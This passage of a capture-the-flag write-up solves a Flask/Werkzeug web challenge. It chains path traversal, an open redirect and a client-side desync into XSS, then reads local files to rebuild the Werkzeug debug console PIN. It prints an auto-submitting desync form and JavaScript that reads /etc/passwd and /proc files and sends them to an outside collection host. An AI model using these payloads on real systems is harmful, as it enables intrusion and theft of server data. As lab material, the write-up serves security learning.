    <span class="n">ipc_file</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">No selected file!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
    
    <span class="k">if</span> <span class="n">ipc_file</span> <span class="ow">and</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">):</span>
        <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span><span class="si">}</span><span class="s">.png</span><span class="sh">'</span>  <span class="c1"># [1]
</span>        <span class="n">ipc_file</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">UPLOAD_FOLDER</span><span class="sh">'</span><span class="p">],</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span> <span class="c1"># [2]
</span>        <span class="nf">update_ipc_db</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>

        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">File submitted! Our moderators will review your request.</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file! only png files are allowed</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
</code></pre></div></div>

<p>On line [1], you could see <code class="language-plaintext highlighter-rouge">ipc_file.filename</code> value is taken from the username (which is controllable by the user) and then directly used in <code class="language-plaintext highlighter-rouge">path.join</code> operation.</p>

<p>This is bad practise as it leads to path traversal here also</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">sudi</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">/home/ubuntu/sudi</span><span class="sh">'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span>
</code></pre></div></div>

<p>If the username is like this <code class="language-plaintext highlighter-rouge">/username</code> then os.path.join operation will return <code class="language-plaintext highlighter-rouge">/username</code> instead (it will ignore everything what‚Äôs before) this would have allowed us to have arbitrary file write on the file system which we could we use to overwrite any template then get easy rce but as the application appends the extenion to it <code class="language-plaintext highlighter-rouge">f'{user["username"]}.png'</code> we can‚Äôt make use of this as we can;t do anything malicious by overwriting png files.</p>

<p>Examining the bot.py file we discover something:</p>

<p>The report endpoint takes the value from the id parameter but as there is no checks we can provide anything else also there.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/report</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@is_authenticated</span>
<span class="k">def</span> <span class="nf">report</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="p">.</span><span class="n">is_json</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Missing required parameters!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>
    
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">()</span>

    <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
</code></pre></div></div>

<p>bot.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/login</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">execute_script</span><span class="p">(</span><span class="sh">"</span><span class="s">document.getElementById(</span><span class="sh">'</span><span class="s">login-btn</span><span class="sh">'</span><span class="s">).click()</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/profile/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span> <span class="o">//</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div></div>

<p>On line [3] you could see the <code class="language-plaintext highlighter-rouge">id</code> is directly added to the url , this again could lead to path traversal. This one is interesing as we could chain this with the open redirect bug.
Let me explain the bot was restricted to visit the profile page only but due to the path traversal and open redirect bug we could make the bot visit any page we want.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"../go?to=https://atacker.com/"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>This gave more of a hint that the xss bug can be on any page instead of just the profile page.</p>

<p>We we started looking at the client side javascript code, to look for any xss sink:</p>

<p>At first this looked interesting:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">populateBots</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">sBots</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">data</span><span class="p">(</span><span class="dl">'</span><span class="s1">botExp</span><span class="dl">'</span><span class="p">);</span>

    <span class="kd">let</span> <span class="nx">botsHTML</span> <span class="o">=</span> <span class="s2">`&lt;div class="row justify-content-center"&gt;`</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">botsData</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">sBots</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`
            &lt;div class='col-md-3 bots-col'&gt;
                &lt;img src='</span><span class="p">${</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">}</span><span class="s2">' class='bots-img'&gt;
            &lt;/div&gt;`</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`&lt;/div&gt;`</span><span class="p">;</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">botsHTML</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>[4] botsData is decalred inside this file http://localhost:1337/static/js/global.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">botsData</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
       <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">DisBot</span><span class="dl">"</span><span class="p">,</span>
       <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/static/images/bots/jake-parker-discord.png</span><span class="dl">"</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>As the source is directly used in the jquery html sink we thought if we can clobber <code class="language-plaintext highlighter-rouge">window.botsData</code> we could get xss.But we couldn‚Äôt find any injection point.</p>

<p>Meanwhile my friend pointed out that the <code class="language-plaintext highlighter-rouge">/debug</code> endpoint has Werkzeug console exposed (as the application is running in debug mode), but we don‚Äôt know the pin.</p>

<p>This is where we came up with a plan how to solve this challenge by chaining all the pieces we already have.</p>

<p>Searching on google we found this blog https://www.daehee.com/werkzeug-console-pin-exploit/, which explains how you can genrate the PIN if you have a path traversal bug.By following this we should be able to get the PIN</p>

<p>Here‚Äôs how the attack will look:
Consider the xss endpoint to be <code class="language-plaintext highlighter-rouge">/xssendpoint</code></p>

<p>In the report endpoint, modify the id parameter in the request to <code class="language-plaintext highlighter-rouge">../go?to=/xssendpoint</code> . This will redirect the bot to the page where we have xss.Using the  xss bug make a request to the <code class="language-plaintext highlighter-rouge">/api/ipc_download?file=../../../../etc/passwd</code> endpoint and get the response and sent it to our controlled server. (we will fetch the necessary information needed to generate the pin)</p>

<hr />

<h1 id="xss">XSS</h1>

<p>We are still misisng an important piece to prove our attack , xss. At this point we were clueless then my friend pointed our that the challenge name relates <em>web desync</em> maybe we need to exploit this to get xss.
At that time we both remembered about seeing a new research by @kevin_mizu on <em>Abusing Client-Side Desync on Werkzeug</em> as we were dealing Werkzeug this looked very promising.</p>

<p>https://mizu.re/post/abusing-client-side-desync-on-werkzeug</p>

<p>Oxbla confirmed that it is ineeded vulnerable to desync attack. I was reading the research blog at that time as I am not good with this attack, the version mentioned in that blog was same as what was used in the challenge</p>

<p>requirements.txt</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flask==2.1.0
Werkzeug==2.1.0
</code></pre></div></div>

<p>https://nvd.nist.gov/vuln/detail/cve-2022-29361</p>

<p>Mizu really went deep into his research and even undercover an interesting open redirect to demonstrate how this bug could could be chained together which will lead to account takeover.</p>

<p>I won‚Äôt go into the details as Mizu already explained everything very well in simple terms so make sure to read his research before continuing</p>

<p>This is the open redirect which I am talking about :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://google.com HTTP/1.1
Host: localhost:1337
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36


</code></pre></div></div>

<p>Response:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 308 PERMANENT REDIRECT
Server: Werkzeug/2.1.0 Python/3.11.4
Date: Mon, 17 Jul 2023 15:18:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 262
Location: http://google.com/?
</code></pre></div></div>

<p>Again check the research blog if you want to know the root cause of this.</p>

<p>By using a form such as this:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
    <span class="na">method=</span><span class="s">"POST"</span>
    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET https://attacker.com HTTP/1.1
    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>


<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/d13d01d6-84ca-4975-96f4-49e0c0796de5" alt="image" /></p>

<p>Upon submitting the above form this what happened:
<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7fdfcc5b-4f7d-4c6b-b3b7-16bbef90c0f8" alt="image" /></p>

<p><em>As we have a Client-Side Desync in Werkzeug, and this kind of attacks allows to control arbitrary bytes of the next request, it is possible to abuse it to recreate the open redirect payload from a malicious HTTP request.</em></p>

<p>Quoting this from Mizu‚Äôs blog what‚Äôs happening here is that the payload send in the request body is used in the next request</p>

<p>In our case the next request was made to http://localhost:1337/static/js/jquery.js , due to the bug in the parsing the request the server  instead of returning the original jquery.js code it returns a 308 redirect response to https://attacker.com (whatever code is returned by this server will be loaded in the page instead jquery.js) this give us a nice xss.</p>

<p>We can confirm this xss by adding this payload to our index.html file</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">alert</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4899cdfb-f18f-43bf-9c7b-61a01fbfad9d" alt="image" /></p>

<p>Great we have the xss now :)</p>

<p>Sample code to read any local file</p>

<p>index.html</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/ipc_download?file=../../../../etc/passwd</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
  <span class="p">})</span>
    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
      <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
    <span class="p">});</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/report HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/json
Content-Length: 94

{
  "id": "../go?to=http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app/test.html"
}
</code></pre></div></div>

<p>test.html contents</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
    <span class="na">method=</span><span class="s">"POST"</span>
    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app HTTP/1.1
    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>


<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/31372554/254163199-24f67c10-a553-4cf4-a363-36eea20310d5.png" alt="image" /></p>

<hr />

<p>To generate the PIN value on our end we need to know some values beforehand:</p>

<p>https://www.daehee.com/werkzeug-console-pin-exploit/</p>

<p>If you are interested in checking the source which generates the pin here it is: https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/<strong>init</strong>.py#L138</p>

<p>We will be using this script to generate the pin: https://github.com/wdahlenburg/werkzeug-debug-console-bypass</p>

<p>As we have alocal setup most of the things we already know:</p>

<blockquote>
  <p>username is the user who started this Flask
root</p>
</blockquote>

<blockquote>
  <p>modname
flask.app</p>
</blockquote>

<blockquote>
  <p>getattr(app, ‚Äò<strong>name</strong>‚Äô, getattr (app .__ class__, ‚Äò<strong>name</strong>‚Äô))
Flask
getattr(mod, ‚Äò<strong>file</strong>‚Äô, None) #is the absolute path of an app.py in the flask directory
/usr/local/lib/python3.11/site-packages/flask/app.py</p>
</blockquote>

<blockquote>
  <p>uuid.getnode()</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /sys/class/net/eth0/address 
02:42:ac:11:00:04
root@9d0ff0081967:/app# python3
Python 3.9.7 <span class="o">(</span>default, Sep  3 2021, 02:02:37<span class="o">)</span> 
<span class="o">[</span>GCC 10.2.1 20210110] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span>.join<span class="o">(</span><span class="s2">"02:42:ac:11:00:04"</span>.split<span class="o">(</span><span class="s2">":"</span><span class="o">))</span>
<span class="s1">'0242ac110004'</span>
<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span>0x0242ac110004<span class="o">)</span>
2485377892356

</code></pre></div></div>

<p>get_machine_id()</p>

<p>Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
With the path traversal we can easily read the values of these files</p>

<p>Here‚Äôs the final payload to get all the required info:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">""</span>
<span class="nx">files</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">/sys/class/net/eth0/address</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/sys/kernel/random/boot_id</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/self/cgroup</span><span class="dl">"</span><span class="p">]</span>




<span class="c1">// loop through files fetch and send to server</span>

<span class="nx">files</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="nx">file</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/ipc_download?file=../../../../</span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
    <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
            <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
        <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>/sys/class/net/eth0/address</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; "".join("02:42:ac:11:00:02".split(":"))
'0242ac110002'
&gt;&gt;&gt; print(0x0242ac110002)
2485377892354
</code></pre></div></div>

<p>/proc/sys/kernel/random/boot_id</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb86
</code></pre></div></div>

<p>/proc/self/cgroup</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12:blkio:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
11:cpuset:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
10:freezer:/docker/97cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
</code></pre></div></div>

<p>machine id =&gt;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a
</code></pre></div></div>

<p>/etc/machine_id can be ignored as this file doesn‚Äôt exist on our challenge server.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="s">root</span><span class="sh">'</span><span class="p">,</span><span class="c1"># username
</span>    <span class="sh">'</span><span class="s">flask.app</span><span class="sh">'</span><span class="p">,</span><span class="c1"># modname
</span>    <span class="sh">'</span><span class="s">Flask</span><span class="sh">'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
</span>    <span class="sh">'</span><span class="s">/usr/local/lib/python3.11/site-packages/flask/app.py</span><span class="sh">'</span> <span class="c1"># getattr(mod, '__file__', None),
</span><span class="p">]</span>

<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="s">2485377892354</span><span class="sh">'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address 
</span>    <span class="c1"># Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
</span>    <span class="sh">'</span><span class="s">d2ad6c68-ebf1-4090-85ff-60e0b7c2fb8697cb5dd0fb03213072481c8a621847f1a310238d2db0de37ac81c8116a509c3a</span><span class="sh">'</span>
<span class="p">]</span>
</code></pre></div></div>

<p>Now run the script werkzeug-pin-bypass.py and you will have the pin</p>

<p>You can see here that they are indeed same :)
<img src="https://user-images.githubusercontent.com/31372554/254167983-a0a1401b-cf80-4e17-b17f-94f8f1cb1635.png" alt="image" /></p>

<p>0xbla did all this scripting work in no time so thanks to him we were able to complete this challenge in no time.</p>

<p>And at last we had the flag</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/02eb4516-ef05-41ea-b9fc-2e36755ddd85" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[Web Desynth Recruit]]></summary></entry></feed>